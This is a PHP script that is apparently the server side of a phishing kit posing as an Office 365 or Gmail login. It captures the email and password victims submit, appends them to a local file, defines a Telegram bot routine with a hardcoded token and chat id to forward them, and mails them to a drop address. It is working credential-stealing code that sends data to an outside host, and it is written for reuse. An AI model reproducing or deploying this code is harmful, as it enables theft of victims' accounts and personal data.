<?php
// DEBUG
// $file = fopen("credentials.txt", "a");
// fwrite($file, json_encode($_POST) . PHP_EOL);
// fwrite($file, json_decode(file_get_contents('php://input'), true)['email']);
// fwrite($file, json_encode($_SERVER) . PHP_EOL);
// fwrite($file, $_POST['email'] . PHP_EOL);
// fclose($file);

$file = fopen("credentials.txt", "a");
$data = json_decode(file_get_contents('php://input'), true);
fwrite($file, $data['email'] . "\t" . $data['password'] . PHP_EOL);
fclose($file);
$message = "**@Donussef*365***+++\n";
$message .= "Email : ".$data['email']."\n";
$message .= "Password : ".$data['password']."\n";
$message .= "User-!P : ".$ip."\n";
$message .= "Country : ".$country."\n\n";
$message .= "----------------------------------------\n";
$message .= "Date : $adddate\n";
$message .= "User-Agent: ".$browser."\n";
function send_telegram_msg($message){
	// Put Your Telegram Information Here
	$botToken  = '5868698173:AAFuxCDnlPEslRFbQvuZ-LZrgDKmQpyjaj4';// your tg token bot from botfather (dont put "bot" infront it)
	$chat_id  = ['5827178314'];// your tg userid from userinfobot
	
	
	$website="https://api.telegram.org/bot".$botToken;
	foreach($chat_id as $ch){
		$params=[
		  'chat_id'=>$ch, 
		  'text'=>$message,
		];
		$ch = curl_init($website . '/sendMessage');
		curl_setopt($ch, CURLOPT_HEADER, false);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 3);
		curl_setopt($ch, CURLOPT_POST, 3);
		curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		$result = curl_exec($ch);
		curl_close($ch);
	}
	return true;
}
// Email
$maildrop = "sample@email.com";
mail($maildrop, "Gmail credentials", $_POST['email'] . "\t" . $_POST['pass']);
